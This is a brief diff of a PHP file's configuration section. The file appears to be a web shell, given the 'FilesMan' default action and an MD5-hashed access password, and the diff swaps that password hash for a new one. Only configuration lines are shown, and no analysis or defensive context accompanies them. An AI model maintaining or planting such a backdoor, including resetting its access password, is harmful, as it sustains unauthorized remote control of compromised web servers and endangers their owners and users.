@@ -11,7 +11,7 @@ session_start();
 
 /* Configuration */
 /* Password using md5 hashes */
-$password = "a2c7daa3bb7b5f694c1ef400f5ab6a81"; //ewe
+$password = "9390ce6e917c7f52a160da2b2ce92457"; //ewe
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
